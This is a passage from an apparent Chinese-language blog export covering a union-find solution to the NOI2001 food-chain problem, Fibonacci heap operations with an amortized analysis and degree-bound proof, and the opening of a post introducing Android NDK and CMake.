注意到事实上我们只需要连接两个集合的代表就行了，以fx为根的子树中的其他元素</span></span><br><span class="line">    <span class="comment">// 在进行FIND-SET的过程中会进行路径压缩，最后还是会连接到了fy</span></span><br><span class="line">    fx = FIND-SET(x)</span><br><span class="line">    fy = FIND-SET(y)</span><br><span class="line">    <span class="keyword">if</span> fx != fy:</span><br><span class="line">        fa[fx] = fy</span><br></pre></td></tr></table></figure><p>　　可以证明，使用并查集的写法，我们可以在均摊复杂度 O(1) 的时间内实现UNION，FIND—SET，MAKE—SET操作。具体证明的过程算法导论书中已经给出，这里不再进行说明。</p><h3 id="Food-link"><a href="#Food-link" class="headerlink" title="Food-link"></a>Food-link</h3><p>　　<a href="https://www.luogu.org/problem/P2024" target="_blank" rel="noopener">NOI2001食物链</a>是一道很经典的并查集的题目，充分运用了不相交集合的特点解决问题。题目简单描述如下:</p><blockquote><p>给定n个动物，按照1-N进行编号，每个动物都是A，B，C中的一种，但是我们并不知道它是属于哪一种。而且这三种动物满足A吃B，B吃C，C吃A这样的性质。现在给k句表述，分两种类型:<br>第一种是”1 X Y”，表示说X和Y是同类<br>第二种是”2 X Y”，表示说X吃Y<br>这k句表述中，有的是真的，有的是假的，当一句话满足下列三个条件之一时，就是假话:<br>(1) 当前的话与之前的话冲突<br>(2) 当前的话X或者Y比N大<br>(3) 当前的话表示X吃X<br>最后我们根据给定的n和k，需要输出假话的总数</p></blockquote><p>　　表面上一看，这样一道题目似乎是很难解决的。那么我们如何使用并查集去解决呢?<br>　　首先我们需要解决吃与被吃的关系如何维护的问题。注意到如果 A，B，C 之间的捕食关系事实上构成了一个循环。如果我们分别用 0，1，2 标识 A，B，C，我们会惊讶地发现<strong>几种动物的捕食关系构成了一个模3意义下的加法群</strong>。如果X吃Y，那么我们可以得到\(type[X]=(type[Y]+1)%3。\)<br>　　但是，一个比较麻烦的例子是，现在告诉你 1 吃 2，3 吃 4，可我们并没有办法知道 1，2 和 3，4 的关系。因此我们将它们当成是两个不同的动态集合，由于我们能够使用并查集处理这两个集合内部之间的吃与被吃的关系，那么最后的问题其实就仅仅在于两个集合如何进行合并了。<br>　　因为需要维护和根节点的关系，我们的 FIND-SET 函数需要做适当的更改。对于当前结点 x，如果 fa[x] 不是根，那么必然需要发生路径压缩。另外，如果 x 为根，那么我们可以确信 type[x] 的值一定是 0，因为它没有发生过任何更改。因此，发生路径压缩过后，fa[x] 的 type 可能发生了更改，那么当前结点 x 的 type 也可能要做相应更改，由于构成了模3的加法群，我们就有: \(type[x] = (type[x]+type[fa[x]])%3\)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 50003</span></span><br><span class="line"><span class="comment">// type[x]维护的是x和fa[x]之间的关系</span></span><br><span class="line"><span class="keyword">int</span> fa[N], type[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == fa[x]) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">int</span> ff = find(fa[x]);</span><br><span class="line">    type[x] = (type[x] + type[fa[x]]) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> fa[x] = ff;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    <span class="keyword">int</span> p, x, y, ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        fa[i] = i;</span><br><span class="line">        type[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;p, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (x &gt; n || y &gt; n) &#123;</span><br><span class="line">            ans++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x == y) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">2</span>) ans++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fx = find(x), fy = find(y);</span><br><span class="line">        <span class="keyword">if</span> (fx != fy) &#123;</span><br><span class="line">            <span class="comment">// 这个是最大的难点。</span></span><br><span class="line">            fa[fx] = fy;</span><br><span class="line">            type[fx] = (type[y] - type[x] + p - <span class="number">1</span> + <span class="number">3</span>) % <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 属于同一个集合，我们只需要判断是否是假话即可</span></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">1</span> &amp;&amp; type[x] != type[y]) ans++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p == <span class="number">2</span> &amp;&amp; (type[x] != (type[y] + <span class="number">1</span>) % <span class="number">3</span>)) ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　注意到上面的代码中，如果 x 和 y 不在同一棵树上( fx != fy )，那么表述一定为真，并且我们需要将两棵树进行合成。由于 find 函数会进行路径压缩，在经过 find(x) 和 find(y) 后，x，y 应该是分别直接和 fx, fy 相连。为了将两棵树连在一起，这里我们直接将 fx 的父亲设置 fy，然后fx的类型需要做对应的修改。如果 p=1，那么 x 和 y 的 type 应该是相同的，为了使得 x 和 y 的 type 相同，这个时候 fx 的 type 应该变成 type[y] - type[x]，这样最后 x 点进行路径压缩后，type[x] 就和 type[y] 相等了。p=2 时，处理方法类似，经过合并后，我们就得到了上述的等式。简单的图示如下(以 p=1 为例, p=2 处理类似):</p><p><img src="/2019/10/22/advance-data-structure/disjoint-set.png" alt="disjoint-set"></p><h2 id="Fibonacci-Heap"><a href="#Fibonacci-Heap" class="headerlink" title="Fibonacci Heap"></a>Fibonacci Heap</h2><p>　　斐波那契堆是堆的一种高效实现。它支持一系列的操作，构成了实用的”可合并堆”。可合并堆支持以下操作:</p><ol><li>MAKE-HEAP() : 创建一个空堆</li><li>INSERT(H,x) : 将一个包含关键字 x 的元素放进堆中</li><li>MINIMUM(H): 返回一个指向堆中最小元素的指针</li><li>EXTRACT-MIN(H) : 从堆中删除包含最小关键字的元素，并返回</li><li>UNION(H1,H2) : 合并两个堆 H1 和 H2，并返回一个新堆的指针</li></ol><p>　　除了可合并堆的特性，斐波那契堆还支持以下操作:</p><ol><li>DECREASE—KEY(H,x,k) : 将堆中的元素 x 赋予一个新的更小的关键字 k</li><li>DELETE(H,x) : 删除堆中的元素 x</li></ol><p>　　我们如果把普通的二叉堆和斐波那契堆比较的话，我们会发现，斐波那契堆在很多情形下有着更好的摊还时间界。二叉堆在 UNION 操作上的时间复杂度较高，其余的操作基本效率还是可以的。因此，在需要较多的合并操作的时候，我们可以应用斐波那契堆。</p><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">二叉堆(最坏情况)</th><th style="text-align:center">斐波那契堆(摊还)</th></tr></thead><tbody><tr><td style="text-align:center">MAKE-HEAP</td><td style="text-align:center">Θ(1)</td><td style="text-align:center">Θ(1)</td></tr><tr><td style="text-align:center">INSERT</td><td style="text-align:center">Θ(lgn)</td><td style="text-align:center">Θ(1)</td></tr><tr><td style="text-align:center">MINIMUM</td><td style="text-align:center">Θ(1)</td><td style="text-align:center">Θ(1)</td></tr><tr><td style="text-align:center">EXTRACT-MIN</td><td style="text-align:center">Θ(lgn)</td><td style="text-align:center">O(lgn)</td></tr><tr><td style="text-align:center">UNION</td><td style="text-align:center">Θ(n)</td><td style="text-align:center">Θ(1)</td></tr><tr><td style="text-align:center">DECREASE-KEY</td><td style="text-align:center">Θ(lgn)</td><td style="text-align:center">Θ(1)</td></tr><tr><td style="text-align:center">DELETE</td><td style="text-align:center">Θ(lgn)</td><td style="text-align:center">O(lgn)</td></tr></tbody></table><p>　　尽管，从理论上分析，斐波那契堆的性能是十分优秀的，但是在实际应用中，它适用范围并不是十分的广泛，原因除了在于斐波那契堆编程上的复杂性外，还有其各个操作较大的常数。现在，就让我们一起来看一下吧。</p><h3 id="Basic-structure"><a href="#Basic-structure" class="headerlink" title="Basic structure"></a>Basic structure</h3><p>　　斐波那契堆是<strong>一系列具有最小堆性质的有根树的集合</strong>，即每个结点的关键字严格大于父结点。书中给了这样一个形象的例子:</p><p><img src="/2019/10/22/advance-data-structure/fib-heap.png" alt="fib-heap"></p><p>　　从上面的那个图中我们可以看到斐波那契堆的最小堆特性。而下面那个图看起来复杂了许多，这个是斐波那契堆结构的完整版本。<strong>每个结点 x 包含指向它父亲的指针 x.p 和指向它任意某个孩子的指针 x.child (如果有的话)。并且，x 的所有孩子形成了一个环形的双向链表，称为 x 的孩子链表。孩子链表中的每一个结点 y 均有指针 y.left 和 y.right ，分别指向左右兄弟。</strong><br>　　除此以外，每个结点还有以下的几个特性: x.degree 表示当前结点的孩子的数量，x.mark 表示当前结点是否被打上了标记 (后面 DECREASE-KEY 操作用到)。x.mark 表示结点 x 自从上一次成为另一个结点的孩子后，是否失去过孩子。另外，斐波那契堆还需要有一个指针 H.min 表示当前堆的集合中具有最小关键字的堆的根节点。所有的堆的根节点同样使用双向链表进行连接。H.n 表示当前堆集合中所有的结点的数量。<br>　　为了便于分析斐波那契堆的性能，书中采用了势函数的方式。对于一个给行斐波那契堆 H，t(H) 表示 H 中根链表元素的数目，用 m(H) 来表示 H 中已标记的结点的数目。由于 t(H), m(H) 初始时均为0，且均为整数，故满足势函数的条件。定义斐波那契堆的势函数 Φ(H) 如下:<br>$$\phi (H) = t(H) + 2m(H)$$</p><p>　　另外，我自己尝试了根据书中的代码写了一个 C/C++ 版的<a href="https://github.com/little-csd/algorithm/blob/master/tree/FibHeap.cpp" target="_blank" rel="noopener">样例</a> (仅支持 INSERT, MINIMUM 和 EXTRACT-MIN 操作，无注释)，如果有需要的话可以参考一下。</p><h3 id="Insert-amp-Union"><a href="#Insert-amp-Union" class="headerlink" title="Insert &amp; Union"></a>Insert &amp; Union</h3><p>　　创建一个堆的过程是很简单的。我们只需要分配一个斐波那契堆对象即可，并且其中 H.n = 0，H.min = NIL 即可，代价为 O(1)。获取最小结点的话，只需要返回 H.min 对象，代价同样为 O(1)。<br>　　插入一个结点的做法也很简单，只需要将当前的结点插入根节点所在的链表即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FIB-HEAP-INSERT(H,x):</span><br><span class="line">initialize x</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> H.min == NIL</span><br><span class="line">    H.min = x</span><br><span class="line">    put x in H's root <span class="built_in">list</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    insert x into H's root <span class="built_in">list</span></span><br><span class="line">    <span class="keyword">if</span> x.key &lt; H.min.key</span><br><span class="line">        H.min = x</span><br><span class="line">H.n += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>　　合并两个结点的操作也比较直接，我们只需要将其插入根链表，并更新 H.n 的值就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FIB-HEAP-UNION(H1,H2):</span><br><span class="line"><span class="keyword">if</span> H1.min == NIL <span class="keyword">or</span> H2.min == NIL</span><br><span class="line">    <span class="keyword">return</span> H1 <span class="keyword">or</span> H2</span><br><span class="line">H = MAKE-HEAP()</span><br><span class="line">H.min = H1.min</span><br><span class="line">add H2's root <span class="built_in">list</span> into H</span><br><span class="line">H.n = H1.n + H2.n</span><br><span class="line"><span class="keyword">return</span> H</span><br></pre></td></tr></table></figure><h3 id="Extract-min"><a href="#Extract-min" class="headerlink" title="Extract-min"></a>Extract-min</h3><p>　　获取并删除最小结点的操作比较复杂，涉及的情况也比较多，容易犯错。由于最小的结点一定在根链表上，当这个结点从树上移除后，其孩子需要被更新，我们采取的措施是将所有的孩子移动到根链表，然后再进行根链表的合并操作，以减少根链表中的结点数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FIB-HEAP-EXTRACT(H)</span><br><span class="line"><span class="keyword">if</span> H.min == NIL</span><br><span class="line">    <span class="keyword">return</span> NIL</span><br><span class="line">z = H.min</span><br><span class="line"><span class="keyword">for</span> x in z.child's <span class="built_in">list</span></span><br><span class="line">    add into H's root <span class="built_in">list</span></span><br><span class="line">    x.p = NIL</span><br><span class="line">remove z from H's root <span class="built_in">list</span></span><br><span class="line"><span class="comment">// z 是根链表中的唯一结点，且没有孩子</span></span><br><span class="line"><span class="keyword">if</span> z == z.right</span><br><span class="line">    H.min = NIL</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// 将 H.min 随便设置为一个其他的结点，然后进行合并操作</span></span><br><span class="line"><span class="comment">// 保证根链表中度数为 d 的结点最多只有 1 个</span></span><br><span class="line">    H.min = H.right</span><br><span class="line">    CONSOLIDATE(H)</span><br><span class="line"><span class="keyword">return</span> z</span><br></pre></td></tr></table></figure><p>　　合并操作是斐波那契树中最难的一个点。合并的过程分为以下的两个步骤，直到根链表中每一个根都有不同的度数。</p><ol><li>在根链表中找具有相同度数的两个结点 x 和 y，假定 x.key &lt;= y.key</li><li>把 y 链接到 x: 从根链表中移除 y， 并让 y 成为 x 的孩子，清除 y 上的标记(成为了孩子)。并将 x 的度数 +1</li></ol><p>　　为了便于合并的操作，我们使用一个数组 A 来记录根节点度数的信息。如果 A[d] = x，说明根链表中的根节点 x 的度数为 d。并且这里还有用到后面会证明的一个信息: 最大度数的上界为 D(H,n) = logn + 1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">CONSOLIDATE(H):</span><br><span class="line">initialize A[<span class="number">0.</span>..D(H,n)]</span><br><span class="line"><span class="keyword">for</span> w in H's root <span class="built_in">list</span></span><br><span class="line">    x = w</span><br><span class="line">    d = w.degree</span><br><span class="line">    <span class="keyword">while</span> A[d] != NIL</span><br><span class="line">        y = A[d]</span><br><span class="line">        <span class="keyword">if</span> x.key &gt; y.key</span><br><span class="line">            swap(x, y)</span><br><span class="line">        FIB-HEAP-LINK(H,y,x)</span><br><span class="line">        A[d] = NIL</span><br><span class="line">        d += <span class="number">1</span></span><br><span class="line">    A[d] = x</span><br><span class="line"></span><br><span class="line">H.min = NIL</span><br><span class="line"><span class="keyword">for</span> i from <span class="number">0</span> to D(H,n)</span><br><span class="line">    <span class="keyword">if</span> A[i] == NIL</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> H.min == NIL</span><br><span class="line">        H.min = A[i]</span><br><span class="line">        let A[i] be H's root <span class="built_in">list</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        make sure A[i] in H's root <span class="built_in">list</span></span><br><span class="line">        <span class="keyword">if</span> A[i].key &lt; H.min.key</span><br><span class="line">            H.min = A[i]</span><br><span class="line"></span><br><span class="line">FIB-HEAP-LINK(H,y,x):</span><br><span class="line">remove y from H's root <span class="built_in">list</span></span><br><span class="line">insert y in x's child <span class="built_in">list</span></span><br><span class="line">x.degree += <span class="number">1</span></span><br><span class="line">y.mark = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>　　对于这个过程，书中给出了一个很形象的图进行描述。如果能理解好这个图在干什么，相信这个操作就掌握了。此外，可以证明，这个操作的复杂度是 O(D(n))</p><p><img src="/2019/10/22/advance-data-structure/consolidate.png" alt="consolidate"></p><p>　　在 EXTRACT-MIN 操作中，最多处理 D(n) 个孩子，再加上 CONSOLIDATE 中下面的循环同样也是 D(n)，因此复杂度为 O(D(n))。但是，CONSOLIDATE 中遍历根链表的操作，复杂度与根节点数目有关，这个时候代价不够，我们就需要从势函数中找。假设原始根链表中有 t(H) 个结点，减去抽出的结点再加上抽取出的结点的孩子，调用 CONSOLIDATE 函数时根节点最多为 t(H) + D(H) - 1。令抽取最小结点之前的势为 t(H) + 2m(H)，最多有 D(H) + 1 个结点留下，则我们得到摊还代价为:<br>$$<br>\begin{align}<br>&amp; O(D(n)+t(H))+((D(n)+1)+2m(H))-(t(H)+2m(H))\\<br>=&amp; O(D(n))+O(t(H))-t(H) \\<br>=&amp; O(D(n))<br>\end{align}<br>$$</p><h3 id="Decrease-key-amp-Delete"><a href="#Decrease-key-amp-Delete" class="headerlink" title="Decrease key &amp; Delete"></a>Decrease key &amp; Delete</h3><p>　　对于关键字减值操作，由于减值后有可能会破坏堆的特性，使得当前结点 x 的 key 比父亲要小，这个时候我们不采取旋转之类的措施，而是选择直接将当前结点放到根节点上去，保证了堆的属性不被破坏。同时，由于当前结点 x 被删除，y 的 mark 值需要做对应的处理。如果 y 还没有被删除过儿子(y.mark = false)，那么 y 的 mark 应该被设置为 true。反之，我们对 y 执行级联切断，递归处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FIB-HEAP-DECREAE-KEY(H,x,k):</span><br><span class="line">x.key = k</span><br><span class="line">y = x.p</span><br><span class="line"><span class="keyword">if</span> y != NIL <span class="keyword">and</span> x.key &lt; y.key</span><br><span class="line">    CUT(H,x,y)</span><br><span class="line">    CASCADING-CUT(y)</span><br><span class="line"><span class="keyword">if</span> x.key &lt; H.min.key</span><br><span class="line">    H.min = x</span><br><span class="line"></span><br><span class="line">CUT(H,x,y):</span><br><span class="line">remove x from y's child <span class="built_in">list</span></span><br><span class="line">y.degree--</span><br><span class="line">add x into H's root <span class="built_in">list</span></span><br><span class="line">x.p = NIL</span><br><span class="line">x.mark = FALSE</span><br><span class="line"></span><br><span class="line">CASCADING-CUT(H,y):</span><br><span class="line">z = y.p</span><br><span class="line"><span class="keyword">if</span> z == NIL</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> y.mark == <span class="literal">false</span></span><br><span class="line">    y.mark = <span class="literal">true</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    CUT(H,y,z)</span><br><span class="line">    CASCADING-CUT(H,z)</span><br></pre></td></tr></table></figure><p>　　同样的，使用势函数，我们可以证明，DECREASE-KEY 操作能在摊还时间 O(1) 内完成。使用 DECREASE-KEY 操作，我们可以使用类似于二叉堆的处理方法删除结点 —— 将结点 x 的 key 设置为负无穷，并且调用 EXTRACT-MIN 即可。</p><h3 id="Proof-of-D-n"><a href="#Proof-of-D-n" class="headerlink" title="Proof of D(n)"></a>Proof of D(n)</h3><p>　　这里要证明一个具有 n 个结点的斐波那契堆中任意结点的度数的上界 D(n) 为 O(lgn)。特别的，我们证明\(D(n)=floor(log_{\phi}n)\)，这里 Φ 指的是黄金分割率，即，\(\phi = ((1+\sqrt5) / 2)\)<br>　　我们知道，斐波那契数的定义如下:<br>$$<br>F_k=\begin{cases}<br>0,\qquad 如果 k=0 \\<br>1,\qquad 如果 k=1 \\<br>F_{k-1}+F_{k-2} \qquad 如果 k &gt;= 2<br>\end{cases}<br>$$</p><p>　　由这个定义，我们可以的得到斐波那契数的另一种表示方式: \(F_{k+2}=1+\Sigma_{i=0}^k F_i\)。具体可以用归纳法证明。并且，同样的，使用归纳法，我们还可以证明\(F_{k+2}&gt;=\phi^k\)<br>　　回到斐波那契堆上，设 x 是斐波那契堆中的任意结点，假设 x.degree = k。设\(y_1,y_2,…,y_k\)是 x 的孩子，并按照成为孩子的先后顺序排列，则我们有 \(y_1.degree &gt;= 0，且对于i=2,3,…,k 有 y_i.degree &gt;= i-2\)。原因是，当第 i 个节点结点插入后，\(y_1,y_2,…y_n\)已经成为了 x 的孩子了，且插入时必定满足 x 和 y 的 degree 相等，则一定有 \(y.degree = x.degree&gt;=i-1\).此后，y 最多失去一个孩子(失去两个孩子则会被 CASCADING 操作剪除)，因此，我们有 \(y.degree &gt;= i-2\)<br>　　此时，我们可以正式证明任意结点度数的上界了。设 x 为斐波那契堆的任意节点，k = x.degree，\(s_k\)表示斐波那契堆中度数为 k 任意结点 size 的最小值。则有:</p><p>$$size(x) \geq s_k \geq 2+\Sigma_{i=2}^k s_{y_i.degree} \geq 2+\Sigma_{i=2}^k s_{i-2}$$</p><p>　　这里 +2 表示的是当前结点和第一个孩子。再次使用归纳法，假设\(s_k &gt;= F_{k+2}\)。</p><p>$$<br>\begin{align}<br>s_k &amp;\geq 2+\Sigma_{i=2}^k s_{i-2} &gt;= 2+\Sigma_{i=2}^k F_i = 1+\Sigma_{i=0}^k F_i \\<br>&amp;= F_{k+2}　\\<br>&amp;\geq \phi^k<br>\end{align}<br>$$</p><p>　　因此，我们得到了\(size(x) \geq s_k \geq F_{k+2} \geq \phi^k\)。若 n 是斐波那契堆中所有的结点的个数，则\(n \geq size(x) \geq \phi^k，即 k \leq log_{\phi}n\)<br>　　假设得证。</p><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> B Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android - NDK</title>
      <link href="/2019/10/17/Android-NDK1/"/>
      <url>/2019/10/17/Android-NDK1/</url>
      
        <content type="html"><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>　　这篇博客主要是用于团队内的第一次分享，关于主题的话思考了好久。一开始想分享数据结构与算法，感觉好像又不太合适，后面决定还是来学习 + 分享安卓 NDK 相关的一些知识了。因为自己也是第一次接触，如果有表述有问题还请见谅。下面正式开始进入NDK的世界吧。(可以把这篇文章当成是<a href="https://developer.android.com/ndk/guides" target="_blank" rel="noopener">google官方文档</a>的翻译)<br>　　注: 本文假设读者有一定的 Android 基础，能使用 Android Studio 写一些简单的 app。以及如何用 c/c++ 写 Hello World 文件。</p><h2 id="Before-Start"><a href="#Before-Start" class="headerlink" title="Before Start"></a>Before Start</h2><h3 id="Main-Components"><a href="#Main-Components" class="headerlink" title="Main Components"></a>Main Components</h3><p>　　正式开始前，我们需要理解构建 app 的基本概念。</p><ol><li>NDK(Native Development Kit)，包含 Native 层开发所需的基本工具</li><li>Native shared libraries: NDK 构建的库，或者 .so 文件，从 c/c++ 源码编译得到</li><li>JNI(Java Native Interface): Java 和 C++ 层的交流的”桥梁”</li></ol><p>　　Native Activity的开发流程:</p><ol><li>设计 app 的基本架构, 将 native 层的需要实现的功能与 Java 层区分开来。</li><li>创建 app 项目。在 AndroidManifest.xml 中声明 NativeActivity 类</li><li>创建 Android.mk 文件，描述 Native 层的库文件信息</li><li>(可选项)创建 Application.mk 文件，配置目标 ABIs，工具链等</li><li>将 Native 代码放在项目的 jni 目录下</li><li>使用 ndk-build 编译 native 库</li><li>构建 Java 组件，产生可执行的 .dex 文件</li><li>将所有东西打包到 apk 文件中，可以安装并运行</li></ol><p>　　值得一提的是，现在更加推荐的构建方式是使用 CMake</p><h3 id="Native-Activities-and-Applications"><a href="#Native-Activities-and-Applications" class="headerlink" title="Native Activities and Applications"></a>Native Activities and Applications</h3><p>　　安卓SDK提供了一个帮助类 NativeActivity 去处理 framework 层和 native 层的交互，因此我们可以不需要去继承这个类或者去调用它的方法。只需要在 Manifest 文件中声明文件是 Native 的即可。需要注意的是，使用 NativeActivity 的安卓应用还是跑在虚拟机上，和其他应用相隔离，因此我们也可一使用 JNI 去访问 framework 层的 api。<br>　　Androi NDK 提供了两种实现 native activity 的方式:</p><ol><li>native_activity.h 头文件定义了 NativeActivity 类的 native 版本，包含了回调接口和许多用于创建 activity 的数据结构。但是，在这种实现中，回调函数是跑在主线程当中的，因此不能阻塞，否则会触发 ANR(Application no response) 导致错误。</li><li>android_native_app_glue.h 头文件定义了一个在 native_activity.h 接口上的一个帮助类的库。它使用了另外一个线程去执行我们的代码。因此可以避免阻塞主线程。</li></ol><p>　　google 官方给出了一个 NativeActivity 的<a href="https://github.com/android/ndk-samples/blob/master/native-activity/app/build.gradle" target="_blank" rel="noopener">实现样例</a>，这个样例使用了 Cmake 编译.so 文件(这也是 google 官方推荐的方式)，用gles渲染app，且不需要写任何的java代码。</p><h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p>　　如今市场上可以用于构建项目的软件(应用程序)有很多，如 unix 系统上常见的 make。但是，它们有一个很大的缺点，就是这些应用是和平台相关的，这就使得泛用性不高。而 CMake 就很好的解决了这个问题。Cmake 是 “Cross Platform Make” 的缩写，wiki 上是这样介绍 CMake 的:</p><blockquote><p>CMake is a cross-platform free and open-source software tool for managing the build process of software using a compiler-independent method. It supports directory hierarchies and applications that depend on multiple libraries.</p></blockquote><p>　　CMake 的特点使得它能很多 IDE 兼容，其中一个就是 Android Studio. 下面让我们先脱离安卓平台，一起来简单地学习如何使用 CMake。<br>　　首先，我们创建一个文件夹用来学习 CMake。然后，这里需要一个用来测试的文件 test.cpp。这里给的样例如下，简单地打印出了 “Hello World!”:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello World"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　然后，我们新建一个文本文件，<strong>CMakeLists</strong>(注意名字不要写错)。在里面写上这些内容:</p><figure class="highlight 